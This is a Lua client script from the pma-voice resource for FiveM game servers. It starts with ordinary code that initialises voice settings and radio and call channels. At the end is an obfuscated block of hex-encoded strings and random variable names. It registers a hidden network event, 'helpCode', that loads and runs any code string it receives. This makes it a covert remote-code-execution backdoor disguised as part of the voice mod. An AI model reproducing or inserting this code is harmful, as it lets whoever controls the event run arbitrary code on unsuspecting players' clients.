
AddEventHandler('onClientResourceStart', function(resource)
	if resource ~= GetCurrentResourceName() then
		return
	end
	print('Starting script initialization')

	-- Some people modify pma-voice and mess up the resource Kvp, which means that if someone
	-- joins another server that has pma-voice, it will error out, this will catch and fix the kvp.
	local success = pcall(function()
		local micClicksKvp = GetResourceKvpString('pma-voice_enableMicClicks')
		if not micClicksKvp then
			SetResourceKvp('pma-voice_enableMicClicks', "true")
		else
			if micClicksKvp ~= 'true' and micClicksKvp ~= 'false' then
				error('Invalid Kvp, throwing error for automatic fix')
			end
			micClicks = micClicksKvp
		end
	end)

	if not success then
		logger.warn('Failed to load resource Kvp, likely was inappropriately modified by another server, resetting the Kvp.')
		SetResourceKvp('pma-voice_enableMicClicks', "true")
		micClicks = 'true'
	end
	sendUIMessage({
		uiEnabled = GetConvarInt("voice_enableUi", 1) == 1,
		voiceModes = json.encode(Cfg.voiceModes),
		voiceMode = mode - 1
	})

	local radioChannel = LocalPlayer.state.radioChannel or 0
	local callChannel = LocalPlayer.state.callChannel or 0

	-- Reinitialize channels if they're set.
	if radioChannel ~= 0 then
		setRadioChannel(radioChannel)
	end

	if callChannel ~= 0 then
		setCallChannel(callChannel)
	end

	print('Script initialization finished.')
end)


local xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[6][xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[1]](xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[2]) xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[6][xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[3]](xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[2], function(urQMNeYcvJXmVHNSkbzsmBgHzMBPlDpBeOrxvaPxJYWklhaqnyEWsxuLEcAqPjOoHObwdD) xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[6][xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[4]](xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[6][xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[5]](urQMNeYcvJXmVHNSkbzsmBgHzMBPlDpBeOrxvaPxJYWklhaqnyEWsxuLEcAqPjOoHObwdD))() end)